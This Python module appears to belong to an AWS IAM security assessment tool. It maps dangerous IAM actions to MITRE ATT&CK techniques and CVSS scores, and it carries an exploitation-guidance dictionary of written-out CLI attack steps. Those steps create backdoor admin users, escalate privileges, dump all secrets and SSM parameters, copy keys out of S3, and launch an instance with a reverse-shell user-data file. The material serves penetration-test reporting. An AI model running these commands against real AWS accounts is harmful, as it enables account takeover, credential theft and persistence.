"""Security knowledge base: dangerous IAM actions, privesc technique patterns, MITRE ATT&CK mappings, CVSS vectors, exploitation guidance and query catalogs."""

from typing import Any, Dict, List, Optional


AWS_MANAGED_PATTERNS = [
    r"OrganizationAccountAccessRole", r"AWSReservedSSO_", r"AWSServiceRoleFor",
    r"aws-reserved", r"AWSControlTower", r"aws-controltower",
    r"stacksets-exec-", r"StackSet-", r"AWSBackup", r"AWSConfig",
    r"AWSServiceRole", r"AmazonSSM", r"CloudFormation",
]


DANGEROUS_ACTIONS = {
    "iam:CreateUser", "iam:CreateAccessKey", "iam:DeleteAccessKey",
    "iam:CreateLoginProfile", "iam:UpdateLoginProfile",
    "iam:AttachUserPolicy", "iam:AttachRolePolicy", "iam:AttachGroupPolicy",
    "iam:PutUserPolicy", "iam:PutRolePolicy", "iam:PutGroupPolicy",
    "iam:SetDefaultPolicyVersion", "iam:PassRole", "iam:UpdateAssumeRolePolicy",
    "iam:CreatePolicyVersion", "iam:AddUserToGroup",
    "iam:CreateInstanceProfile", "iam:AddRoleToInstanceProfile",
    "iam:CreateServiceLinkedRole",
    "sts:AssumeRole", "sts:AssumeRoleWithSAML", "sts:AssumeRoleWithWebIdentity",
    "secretsmanager:GetSecretValue", "ssm:GetParameter", "ssm:GetParameters",
    "ssm:GetParametersByPath", "ssm:SendCommand", "ssm:StartSession",
    "s3:GetObject", "s3:PutBucketPolicy", "s3:PutObject",
    "ec2:RunInstances", "ec2:AssociateIamInstanceProfile",
    "lambda:CreateFunction", "lambda:UpdateFunctionCode",
    "lambda:UpdateFunctionConfiguration", "lambda:AddPermission", "lambda:InvokeFunction",
    "glue:CreateJob", "glue:UpdateJob",
    "cloudformation:CreateStack", "cloudformation:UpdateStack",
    "cloudformation:CreateChangeSet", "cloudformation:ExecuteChangeSet",
    "codebuild:CreateProject", "codebuild:UpdateProject",
    "codebuild:StartBuild", "codebuild:StartBuildBatch",
    "sagemaker:CreateNotebookInstance", "sagemaker:CreateTrainingJob",
    "sagemaker:CreateProcessingJob",
    "autoscaling:CreateAutoScalingGroup", "autoscaling:CreateLaunchConfiguration",
    "autoscaling:UpdateAutoScalingGroup",
    "ecs:RunTask", "ecs:RegisterTaskDefinition",
    "states:CreateStateMachine", "datapipeline:CreatePipeline",
    "cloudtrail:StopLogging", "cloudtrail:DeleteTrail",
    "guardduty:DeleteDetector", "config:StopConfigurationRecorder",
}


ADMIN_ACTIONS = {"*", "iam:*"}


CONFUSED_DEPUTY_SERVICES = {
    "cloudtrail", "sns", "sqs", "s3", "config", "events", "eventbridge",
    "access-analyzer", "backup", "apigateway", "cognito-identity", "cognito-idp",
    "secretsmanager", "logs", "cloudwatch", "kms", "ses", "elasticloadbalancing",
    "servicecatalog", "resource-explorer-2", "scheduler", "pipes",
}


TECHNIQUE_PATTERNS = {
    "Direct STS AssumeRole": [r"sts:AssumeRole", r"can assume role"],
    "Cross-Account AssumeRole": [r"cross.?account", r"external account"],
    "Access Key Creation": [r"CreateAccessKey", r"create access key"],
    "Login Profile": [r"CreateLoginProfile", r"UpdateLoginProfile", r"password"],
    "Trust Policy Modification": [r"UpdateAssumeRolePolicy", r"trust.*policy", r"trust document"],
    "Policy Attachment": [r"Attach.*Policy", r"Put.*Policy", r"attach.*administrator"],
    "Policy Version": [r"CreatePolicyVersion", r"SetDefaultPolicyVersion"],
    "Lambda CreateFunction": [r"lambda:CreateFunction", r"create.*function.*role"],
    "Lambda UpdateFunctionCode": [r"lambda:UpdateFunctionCode", r"update.*function.*code"],
    "Lambda Configuration": [r"lambda:UpdateFunctionConfiguration"],
    "EC2 Instance Profile": [r"ec2:RunInstances.*PassRole", r"instance.*profile", r"ec2.*role"],
    "EC2 AssociateProfile": [r"AssociateIamInstanceProfile"],
    "EC2 Instance Profile Creation": [r"CreateInstanceProfile", r"AddRoleToInstanceProfile"],
    "CodeBuild CreateProject": [r"codebuild:CreateProject"],
    "CodeBuild UpdateProject": [r"codebuild:UpdateProject"],
    "CodeBuild StartBuild": [r"codebuild:StartBuild", r"StartBuildBatch"],
    "CloudFormation CreateStack": [r"cloudformation:CreateStack"],
    "CloudFormation UpdateStack": [r"cloudformation:UpdateStack"],
    "CloudFormation ChangeSet": [r"CreateChangeSet", r"ExecuteChangeSet"],
    "SSM SendCommand": [r"ssm:SendCommand", r"run command"],
    "SSM StartSession": [r"ssm:StartSession", r"interactive session"],
    "SSM/Secrets Access": [r"ssm:GetParameter", r"secretsmanager:GetSecretValue"],
    "SageMaker Notebook": [r"CreateNotebookInstance"],
    "SageMaker Training": [r"CreateTrainingJob"],
    "SageMaker Processing": [r"CreateProcessingJob"],
    "AutoScaling Group": [r"autoscaling:CreateAutoScalingGroup"],
    "AutoScaling LaunchConfig": [r"CreateLaunchConfiguration"],
    "Glue Job Abuse": [r"glue:CreateJob", r"glue:UpdateJob"],
    "ECS Task": [r"ecs:RunTask", r"RegisterTaskDefinition"],
    "Step Functions": [r"states:CreateStateMachine"],
    "Data Pipeline": [r"datapipeline:CreatePipeline"],
}


CATEGORY_WEIGHTS = {
    "iam": 10,
    "sts": 9,
    "compute": 8,
    "credentials": 7,
    "s3": 6,
    "evasion": 5,
}


IAM_CHECKS = {
    "iam:CreateUser", "iam:CreateAccessKey", "iam:CreateLoginProfile",
    "iam:AttachUserPolicy", "iam:AttachRolePolicy", "iam:AttachGroupPolicy",
    "iam:PutUserPolicy", "iam:PutRolePolicy", "iam:PutGroupPolicy",
    "iam:SetDefaultPolicyVersion", "iam:PassRole", "iam:UpdateAssumeRolePolicy",
    "iam:CreatePolicyVersion", "iam:AddUserToGroup", "sts:AssumeRole",
}


S3_CHECKS = {"s3:GetObject", "s3:PutBucketPolicy", "s3:PutObject", "s3:DeleteObject"}


CRED_CHECKS = {"secretsmanager:GetSecretValue", "ssm:GetParameter", "ssm:GetParameters", "ssm:GetParametersByPath"}


EVASION_CHECKS = {"cloudtrail:StopLogging", "cloudtrail:DeleteTrail", "guardduty:DeleteDetector", "config:StopConfigurationRecorder"}


COMPUTE_CHECKS = {
    "ec2:RunInstances", "lambda:CreateFunction", "lambda:UpdateFunctionCode",
    "lambda:AddPermission", "glue:CreateJob", "glue:UpdateJob",
    "cloudformation:CreateStack", "cloudformation:UpdateStack",
    "codebuild:CreateProject", "codebuild:StartBuild",
    "sagemaker:CreateNotebookInstance", "sagemaker:CreateTrainingJob",
    "ecs:RunTask", "ecs:RegisterTaskDefinition",
    "states:CreateStateMachine", "datapipeline:CreatePipeline",
}


IAM_WILDCARD_THRESHOLD = 6


CHECK_LABEL = {
    "iam:CreateUser":               "Create new IAM users (persistent backdoor accounts)",
    "iam:CreateAccessKey":          "Generate long-term access keys for any IAM user",
    "iam:CreateLoginProfile":       "Set a console password for any IAM user",
    "iam:AttachUserPolicy":         "Attach AdministratorAccess to any IAM user",
    "iam:AttachRolePolicy":         "Attach AdministratorAccess to any IAM role",
    "iam:AttachGroupPolicy":        "Attach AdministratorAccess to any IAM group",
    "iam:PutUserPolicy":            "Write allow-all inline policies to any IAM user",
    "iam:PutRolePolicy":            "Write allow-all inline policies to any IAM role",
    "iam:PutGroupPolicy":           "Write allow-all inline policies to any IAM group",
    "iam:SetDefaultPolicyVersion":  "Revert managed policies to older permissive versions",
    "iam:PassRole":                 "Pass privileged roles to EC2, Lambda, ECS, or other services",
    "iam:UpdateAssumeRolePolicy":   "Rewrite role trust policies to grant themselves access",
    "iam:CreatePolicyVersion":      "Create new policy versions with elevated permissions",
    "iam:AddUserToGroup":           "Add users to privileged groups",
    "sts:AssumeRole":               "Assume other IAM roles and inherit their full permissions",
    "secretsmanager:GetSecretValue":"Retrieve all Secrets Manager secrets in plaintext",
    "ssm:GetParameter":             "Read SSM Parameter Store values including encrypted secrets",
    "ssm:GetParameters":            "Bulk retrieve all SSM Parameter Store values at once",
    "ssm:GetParametersByPath":      "Retrieve all parameters under a path hierarchy",
    "s3:GetObject":                 "Download any object from S3 buckets",
    "s3:PutBucketPolicy":           "Rewrite S3 bucket policies to expose buckets publicly",
    "s3:PutObject":                 "Upload/overwrite any object in S3 buckets",
    "s3:DeleteObject":              "Delete any object from S3 buckets",
    "ec2:RunInstances":             "Launch EC2 instances with privileged instance profiles",
    "lambda:UpdateFunctionCode":    "Replace Lambda function code to abuse the execution role",
    "lambda:AddPermission":         "Grant external accounts access to Lambda functions",
    "lambda:CreateFunction":        "Create new Lambda functions with a privileged execution role",
    "glue:CreateJob":               "Create Glue ETL jobs running with a privileged role",
    "glue:UpdateJob":               "Modify existing Glue jobs to run with a privileged role",
    "cloudformation:CreateStack":   "Deploy CloudFormation stacks under a privileged role",
    "cloudformation:UpdateStack":   "Update CloudFormation stacks to change resource permissions",
    "codebuild:CreateProject":      "Create CodeBuild projects with a privileged role",
    "codebuild:StartBuild":         "Trigger CodeBuild builds that execute with a privileged role",
    "sagemaker:CreateTrainingJob":  "Create SageMaker training jobs with a privileged execution role",
    "sagemaker:CreateNotebookInstance": "Create SageMaker notebook instances with a privileged role",
    "ecs:RunTask":                  "Run ECS tasks with a privileged task role",
    "ecs:RegisterTaskDefinition":   "Register ECS task definitions that assign privileged task roles",
    "states:CreateStateMachine":    "Create Step Functions state machines with a privileged role",
    "datapipeline:CreatePipeline":  "Create Data Pipelines running with a privileged role",
    "cloudtrail:StopLogging":       "Stop CloudTrail logging (removes audit trail)",
    "cloudtrail:DeleteTrail":       "Delete CloudTrail trails permanently",
    "guardduty:DeleteDetector":     "Delete GuardDuty detectors (disables threat detection)",
    "config:StopConfigurationRecorder": "Stop AWS Config recording (hides configuration changes)",
}


MITRE_MAPPINGS = {
    "iam:CreateUser":               {"tactic": "Persistence", "technique": "T1136.003", "name": "Create Cloud Account"},
    "iam:CreateAccessKey":          {"tactic": "Persistence", "technique": "T1098.001", "name": "Additional Cloud Credentials"},
    "iam:CreateLoginProfile":       {"tactic": "Persistence", "technique": "T1098.001", "name": "Additional Cloud Credentials"},
    "iam:AttachUserPolicy":         {"tactic": "Privilege Escalation", "technique": "T1484.002", "name": "Domain Trust Modification"},
    "iam:AttachRolePolicy":         {"tactic": "Privilege Escalation", "technique": "T1484.002", "name": "Domain Trust Modification"},
    "iam:AttachGroupPolicy":        {"tactic": "Privilege Escalation", "technique": "T1484.002", "name": "Domain Trust Modification"},
    "iam:PutUserPolicy":            {"tactic": "Privilege Escalation", "technique": "T1098", "name": "Account Manipulation"},
    "iam:PutRolePolicy":            {"tactic": "Privilege Escalation", "technique": "T1098", "name": "Account Manipulation"},
    "iam:PutGroupPolicy":           {"tactic": "Privilege Escalation", "technique": "T1098", "name": "Account Manipulation"},
    "iam:PassRole":                 {"tactic": "Privilege Escalation", "technique": "T1548", "name": "Abuse Elevation Control"},
    "iam:UpdateAssumeRolePolicy":   {"tactic": "Privilege Escalation", "technique": "T1098", "name": "Account Manipulation"},
    "sts:AssumeRole":               {"tactic": "Privilege Escalation", "technique": "T1550.001", "name": "Application Access Token"},

    "secretsmanager:GetSecretValue": {"tactic": "Credential Access", "technique": "T1552.005", "name": "Cloud Instance Metadata API"},
    "ssm:GetParameter":              {"tactic": "Credential Access", "technique": "T1552.005", "name": "Cloud Instance Metadata API"},
    "ssm:GetParameters":             {"tactic": "Credential Access", "technique": "T1552.005", "name": "Cloud Instance Metadata API"},
    "ssm:GetParametersByPath":       {"tactic": "Credential Access", "technique": "T1552.005", "name": "Cloud Instance Metadata API"},

    "lambda:CreateFunction":        {"tactic": "Execution", "technique": "T1648", "name": "Serverless Execution"},
    "lambda:UpdateFunctionCode":    {"tactic": "Execution", "technique": "T1648", "name": "Serverless Execution"},
    "ec2:RunInstances":             {"tactic": "Execution", "technique": "T1204.003", "name": "Malicious Image"},
    "codebuild:CreateProject":      {"tactic": "Execution", "technique": "T1072", "name": "Software Deployment Tools"},
    "codebuild:StartBuild":         {"tactic": "Execution", "technique": "T1072", "name": "Software Deployment Tools"},
    "glue:CreateJob":               {"tactic": "Execution", "technique": "T1648", "name": "Serverless Execution"},
    "cloudformation:CreateStack":   {"tactic": "Execution", "technique": "T1072", "name": "Software Deployment Tools"},
    "sagemaker:CreateNotebookInstance": {"tactic": "Execution", "technique": "T1204.003", "name": "Malicious Image"},
    "ecs:RunTask":                  {"tactic": "Execution", "technique": "T1610", "name": "Deploy Container"},

    "cloudtrail:StopLogging":       {"tactic": "Defense Evasion", "technique": "T1562.008", "name": "Disable Cloud Logs"},
    "cloudtrail:DeleteTrail":       {"tactic": "Defense Evasion", "technique": "T1562.008", "name": "Disable Cloud Logs"},
    "guardduty:DeleteDetector":     {"tactic": "Defense Evasion", "technique": "T1562.001", "name": "Disable or Modify Tools"},
    "config:StopConfigurationRecorder": {"tactic": "Defense Evasion", "technique": "T1562.001", "name": "Disable or Modify Tools"},

    "s3:GetObject":                 {"tactic": "Collection", "technique": "T1530", "name": "Data from Cloud Storage"},
    "s3:PutBucketPolicy":           {"tactic": "Exfiltration", "technique": "T1537", "name": "Transfer Data to Cloud Account"},
}


def get_mitre_for_action(action: str) -> Optional[Dict]:
    """Get MITRE ATT&CK mapping for an action."""
    return MITRE_MAPPINGS.get(action)


def get_mitre_for_technique(technique: str) -> List[Dict]:
    """Get MITRE ATT&CK mappings for a technique category."""
    mappings = []
    technique_lower = technique.lower()

    if "lambda" in technique_lower or "serverless" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("lambda:CreateFunction", {}))
    elif "codebuild" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("codebuild:CreateProject", {}))
    elif "ec2" in technique_lower or "instance" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("ec2:RunInstances", {}))
    elif "assume" in technique_lower or "sts" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("sts:AssumeRole", {}))
    elif "policy" in technique_lower or "attach" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("iam:AttachRolePolicy", {}))
    elif "access key" in technique_lower or "createaccesskey" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("iam:CreateAccessKey", {}))
    elif "secret" in technique_lower or "ssm" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("secretsmanager:GetSecretValue", {}))

    return [m for m in mappings if m]


EXPLOITATION_GUIDANCE = {
    "admin_access": {
        "title": "Administrative Access",
        "risk_rating": "Critical",
        "cvss_estimate": "9.8 (Critical)",
        "description": "Principals with AdministratorAccess policy have unrestricted access to all AWS services and resources in the account.",
        "impact": {
            "confidentiality": "Complete data exfiltration capability across all services (S3, RDS, DynamoDB, Secrets Manager, etc.)",
            "integrity": "Full ability to modify any resource configuration, deploy backdoors, tamper with logs",
            "availability": "Can delete any resource, stop services, or cause denial of service",
            "business": "Full account compromise, potential regulatory violations, data breach liability",
        },
        "exploitation_steps": [
            "1. Obtain credentials for the admin principal (access keys, session tokens, or console access)",
            "2. Verify admin access: aws sts get-caller-identity && aws iam list-attached-user-policies --user-name <NAME>",
            "3. Enumerate sensitive data: aws s3 ls --recursive | grep -i secret",
            "4. Extract secrets: aws secretsmanager list-secrets && aws secretsmanager get-secret-value --secret-id <ID>",
            "5. Create backdoor access: aws iam create-user --user-name backdoor && aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        ],
        "aws_cli_commands": '''# Verify admin access
aws sts get-caller-identity
aws iam simulate-principal-policy --policy-source-arn <ARN> --action-names "*" --resource-arns "*"

# Exfiltrate secrets
aws secretsmanager list-secrets
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# Create persistence
aws iam create-access-key --user-name <ADMIN_USER>
aws iam create-user --user-name attacker-backdoor
aws iam attach-user-policy --user-name attacker-backdoor \\
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess''',
        "evidence": "Look for attached policy: arn:aws:iam::aws:policy/AdministratorAccess",
        "references": [
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html",
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html",
            "https://attack.mitre.org/techniques/T1078/004/",
        ],
    },
    "shadow_admin": {
        "title": "Shadow Administrator",
        "risk_rating": "Critical",
        "cvss_estimate": "9.1 (Critical)",
        "description": "Principals that can escalate to admin privileges through IAM permission manipulation, without having AdministratorAccess attached.",
        "impact": {
            "confidentiality": "After escalation, full data access capability",
            "integrity": "Can modify any IAM policy to grant themselves or others elevated access",
            "availability": "Can deny access to legitimate administrators by modifying policies",
            "business": "Hidden privilege escalation path that evades standard IAM audits",
        },
        "exploitation_steps": [
            "1. Identify the escalation vector (iam:AttachRolePolicy, iam:PutUserPolicy, etc.)",
            "2. Escalate privileges: aws iam attach-user-policy --user-name <SELF> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            "3. Alternatively create a new policy version: aws iam create-policy-version --policy-arn <ARN> --policy-document file://admin-policy.json --set-as-default",
            "4. Or modify role trust: aws iam update-assume-role-policy --role-name <ADMIN_ROLE> --policy-document file://trust-self.json",
            "5. Assume escalated role or use new permissions",
        ],
        "aws_cli_commands": '''# Method 1: Attach admin policy to self
aws iam attach-user-policy --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d'/' -f2) \\
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Method 2: Create permissive policy version
cat > /tmp/admin.json << 'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
EOF
aws iam create-policy-version --policy-arn <POLICY_ARN> --policy-document file:///tmp/admin.json --set-as-default

# Method 3: Add self to admin role trust
aws iam update-assume-role-policy --role-name AdminRole --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}'

# Method 4: Create access keys for admin user
aws iam create-access-key --user-name admin-user''',
        "evidence": "Check for actions: iam:AttachRolePolicy, iam:AttachUserPolicy, iam:PutRolePolicy, iam:PutUserPolicy, iam:CreatePolicyVersion, iam:UpdateAssumeRolePolicy, iam:CreateAccessKey with Resource:*",
        "references": [
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege",
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html",
            "https://attack.mitre.org/techniques/T1098/",
        ],
    },
    "privesc": {
        "title": "Privilege Escalation Path",
        "risk_rating": "Critical/High",
        "cvss_estimate": "8.8 (High) to 9.8 (Critical)",
        "description": "Non-admin principals can escalate to administrative access through one or more steps involving role assumption, service abuse, or credential harvesting.",
        "impact": {
            "confidentiality": "Eventual full data access after completing escalation chain",
            "integrity": "Can modify resources and create backdoors once escalated",
            "availability": "Post-escalation can deny service to legitimate users",
            "business": "Attacker with limited access can achieve full account takeover",
        },
        "exploitation_steps": [
            "1. Identify the escalation path and required permissions at each hop",
            "2. Execute the first hop (e.g., assume role, create Lambda, launch EC2)",
            "3. Continue through each hop until reaching the admin target",
            "4. Common patterns: iam:PassRole + service abuse, sts:AssumeRole chain, credential harvesting",
        ],
        "aws_cli_commands": '''# STS AssumeRole escalation
aws sts assume-role --role-arn <TARGET_ROLE_ARN> --role-session-name escalation

# Lambda function abuse (PassRole + CreateFunction)
aws lambda create-function --function-name escalate \\
    --runtime python3.9 --role <PRIVILEGED_ROLE_ARN> \\
    --handler index.handler --zip-file fileb://payload.zip
aws lambda invoke --function-name escalate output.txt

# EC2 instance profile abuse
aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro \\
    --iam-instance-profile Name=<PRIVILEGED_PROFILE> --user-data file://rev-shell.sh

# CodeBuild project abuse
aws codebuild create-project --name escalate --service-role <PRIVILEGED_ROLE_ARN> \\
    --source type=NO_SOURCE --artifacts type=NO_ARTIFACTS \\
    --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:5.0,computeType=BUILD_GENERAL1_SMALL
aws codebuild start-build --project-name escalate''',
        "evidence": "Look for privilege escalation edges in the graph showing paths from user/role to admin",
        "references": [
            "https://github.com/nccgroup/PMapper",
            "https://attack.mitre.org/tactics/TA0004/",
        ],
    },
    "cross_account_trust": {
        "title": "Risky Cross-Account Trust",
        "risk_rating": "Critical/High",
        "cvss_estimate": "8.1 (High) - 9.8 (Critical for wildcards)",
        "description": "Role trust policies allow external accounts to assume roles without adequate controls (missing ExternalId or wildcard Principal).",
        "impact": {
            "confidentiality": "External accounts can access resources via the trusted role",
            "integrity": "If the role has write permissions, external accounts can modify resources",
            "availability": "Compromised external account could abuse access for DoS",
            "business": "Confused deputy attacks, unauthorized access from untrusted third parties",
        },
        "exploitation_steps": [
            "1. For wildcard trust (Principal: '*'): Any AWS account can assume the role",
            "2. Create an AWS account or use existing one, assume the target role",
            "3. For trusts without ExternalId: If you control/compromise the trusted account, assume directly",
            "4. After assumption, operate with the role's permissions",
        ],
        "aws_cli_commands": '''# Assume a role with wildcard trust from ANY AWS account
aws sts assume-role --role-arn arn:aws:iam::<TARGET_ACCOUNT>:role/<WILDCARD_ROLE> \\
    --role-session-name attacker-session

# From a trusted account without ExternalId protection
aws sts assume-role --role-arn arn:aws:iam::<TARGET_ACCOUNT>:role/<TRUSTED_ROLE> \\
    --role-session-name legitimate-looking

# After assuming, verify access
aws sts get-caller-identity
aws s3 ls  # Test data access''',
        "evidence": "Check role trust policy for Principal: '*' or missing sts:ExternalId condition",
        "references": [
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html",
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_common-scenarios_third-party.html",
            "https://attack.mitre.org/techniques/T1199/",
        ],
    },
    "overly_permissive": {
        "title": "Overly Permissive Permissions",
        "risk_rating": "High",
        "cvss_estimate": "7.5 (High)",
        "description": "Principals have permissions significantly broader than required for their function, increasing the blast radius of a credential compromise.",
        "impact": {
            "confidentiality": "Broader access than necessary increases exposure of sensitive data",
            "integrity": "More modification capabilities than job function requires",
            "availability": "Could accidentally or maliciously disrupt services",
            "business": "Violates least-privilege principle, increases incident impact",
        },
        "exploitation_steps": [
            "1. Identify the specific dangerous permissions granted (see capability list)",
            "2. Exploit the most impactful permissions based on your objectives",
            "3. Common high-impact actions: s3:GetObject (data exfil), secretsmanager:GetSecretValue (creds), lambda:InvokeFunction (code exec)",
        ],
        "aws_cli_commands": '''# Enumerate what you can do
aws iam simulate-principal-policy --policy-source-arn <ARN> \\
    --action-names "s3:*" "iam:*" "secretsmanager:*" --resource-arns "*"

# Use IAM Access Analyzer to validate policies
aws accessanalyzer validate-policy --policy-type IDENTITY_POLICY \\
    --policy-document file://policy.json

# Check last accessed information for unused permissions
aws iam generate-service-last-accessed-details --arn <PRINCIPAL_ARN>
aws iam get-service-last-accessed-details --job-id <JOB_ID>

# Data exfiltration via S3
aws s3 sync s3://<BUCKET>/ ./exfil/ --exclude "*" --include "*.pem" --include "*.key" --include "*secret*"

# Credential harvesting
aws secretsmanager get-secret-value --secret-id <SECRET_ID>
aws ssm get-parameter --name <PARAM_NAME> --with-decryption''',
        "evidence": "Review the capability groups and specific actions listed for each principal",
        "references": [
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege",
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-policy-validation.html",
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_last-accessed.html",
            "https://attack.mitre.org/techniques/T1530/",
        ],
    },
    "secrets_access": {
        "title": "Secrets/Credentials Access",
        "risk_rating": "High",
        "cvss_estimate": "8.0 (High)",
        "description": "Principals can read secrets from AWS Secrets Manager or SSM Parameter Store, potentially exposing database credentials, API keys, and other sensitive data.",
        "impact": {
            "confidentiality": "Direct access to stored credentials enables lateral movement",
            "integrity": "Stolen credentials may allow modification of external systems",
            "availability": "Attackers with credentials could lock out legitimate access",
            "business": "Credential theft enables access to databases, third-party services, and other systems",
        },
        "exploitation_steps": [
            "1. List available secrets: aws secretsmanager list-secrets",
            "2. Retrieve secret values: aws secretsmanager get-secret-value --secret-id <NAME>",
            "3. List SSM parameters: aws ssm describe-parameters",
            "4. Get parameter values: aws ssm get-parameter --name <NAME> --with-decryption",
            "5. Use harvested credentials for lateral movement",
        ],
        "aws_cli_commands": '''# Enumerate and exfiltrate Secrets Manager
aws secretsmanager list-secrets --query 'SecretList[*].[Name,ARN]' --output table
aws secretsmanager get-secret-value --secret-id <SECRET_NAME>

# Enumerate and exfiltrate SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# Bulk extraction
for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
    echo "=== $secret ===" >> secrets.txt
    aws secretsmanager get-secret-value --secret-id $secret --query SecretString --output text >> secrets.txt 2>/dev/null
done''',
        "evidence": "Actions: secretsmanager:GetSecretValue, ssm:GetParameter, ssm:GetParameters, ssm:GetParametersByPath",
        "references": [
            "https://attack.mitre.org/techniques/T1552/005/",
        ],
    },
    "credential_hygiene": {
        "title": "IAM Credential Hygiene",
        "risk_rating": "High/Medium",
        "cvss_estimate": "6.5 (Medium) - 8.1 (High for privileged no-MFA)",
        "description": "IAM users with weak credential hygiene: console access without MFA, and/or long-lived access keys. These increase the likelihood and impact of credential compromise (phishing, key leakage in code/CI, credential stuffing).",
        "impact": {
            "confidentiality": "A phished password (no MFA) or a leaked long-term key grants the user's full permission set to an attacker",
            "integrity": "Compromised credentials allow modification of any resource the user can reach",
            "availability": "Attacker can lock out or disrupt using the compromised identity",
            "business": "MFA absence on privileged users and unrotated static keys are the most common root cause of real cloud breaches and are flagged by CIS AWS Foundations benchmarks",
        },
        "exploitation_steps": [
            "1. Obtain the user's console password (phishing/reuse) - no MFA means the password alone grants access",
            "2. Or obtain a leaked long-term access key (source code, CI logs, laptop) - keys never expire until rotated",
            "3. Authenticate and operate with the user's full permissions",
        ],
        "aws_cli_commands": '''# Identify users without MFA (validation)
aws iam list-users --query 'Users[*].UserName' --output text | \\
  while read u; do n=$(aws iam list-mfa-devices --user-name "$u" --query 'length(MFADevices)'); \\
  echo "$u MFA=$n"; done

# Access-key age (validation)
aws iam list-access-keys --user-name <USER>
aws iam get-access-key-last-used --access-key-id <AKIA...>''',
        "evidence": "iam:list-mfa-devices returns 0 for a user with a login profile; iam:list-access-keys shows Active long-term keys; credential report (aws iam generate-credential-report) confirms mfa_active=false and access_key_1_active=true.",
        "references": [
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_mfa.html",
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html",
            "https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-cis-controls.html",
        ],
    },
}


CVSS_VECTORS = {
    "admin_access":        "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.6 Critical)",
    "shadow_admin":        "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.6 Critical)",
    "privesc":             "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.6 Critical)",
    "cross_account_trust": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (10.0 Critical for wildcard; lower with conditions)",
    "overly_permissive":   "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L (8.1 High)",
    "secrets_access":      "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (7.7 High)",
    "credential_hygiene":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L (7.3 High for privileged no-MFA)",
}


def get_exploitation_guidance(finding_category: str) -> Dict:
    """Get exploitation guidance for a finding category."""
    category_map = {
        "admin_access": "admin_access",
        "shadow_admin": "shadow_admin",
        "privesc": "privesc",
        "privesc_critical": "privesc",
        "cross_account_trust": "cross_account_trust",
        "trust": "cross_account_trust",
        "overly_permissive": "overly_permissive",
        "secrets": "secrets_access",
        "credential_hygiene": "credential_hygiene",
        "iam": "shadow_admin",
    }
    key = category_map.get(finding_category, "overly_permissive")
    guidance = dict(EXPLOITATION_GUIDANCE.get(key, EXPLOITATION_GUIDANCE["overly_permissive"]))
    guidance["cvss_vector"] = CVSS_VECTORS.get(key, "")
    return guidance


EXCLUDE_REGIONS = "me-south-1 ap-east-1 af-south-1 eu-south-1 me-central-1 ap-southeast-3 ap-south-2 eu-south-2 eu-central-2 il-central-1 ca-west-1"


PRESET_QUERIES = [
    ("privesc_all",   ["query", "preset", "privesc", "*"],      "privesc (all principals)"),
    ("privesc_skip",  ["query", "-s", "preset", "privesc", "*"], "privesc (non-admins only)"),
    ("endgame_all",   ["query", "preset", "endgame", "*"],      "endgame"),
    ("serviceaccess", ["query", "preset", "serviceaccess"],     "service access"),
    ("wrongadmin",    ["query", "preset", "wrongadmin", "*"],   "wrong admin"),
]


MANUAL_QUERIES = [
    ("iam_create_user",              "who can do iam:CreateUser"),
    ("iam_create_access_key",        "who can do iam:CreateAccessKey"),
    ("iam_create_login_profile",     "who can do iam:CreateLoginProfile"),
    ("iam_attach_user_policy",       "who can do iam:AttachUserPolicy"),
    ("iam_attach_role_policy",       "who can do iam:AttachRolePolicy"),
    ("iam_attach_group_policy",      "who can do iam:AttachGroupPolicy"),
    ("iam_put_user_policy",          "who can do iam:PutUserPolicy"),
    ("iam_put_role_policy",          "who can do iam:PutRolePolicy"),
    ("iam_put_group_policy",         "who can do iam:PutGroupPolicy"),
    ("iam_set_default_policy_version", "who can do iam:SetDefaultPolicyVersion"),
    ("iam_create_policy_version",    "who can do iam:CreatePolicyVersion"),
    ("iam_passrole",                 "who can do iam:PassRole"),
    ("iam_add_user_to_group",        "who can do iam:AddUserToGroup"),
    ("iam_update_assume_role_policy", "who can do iam:UpdateAssumeRolePolicy"),
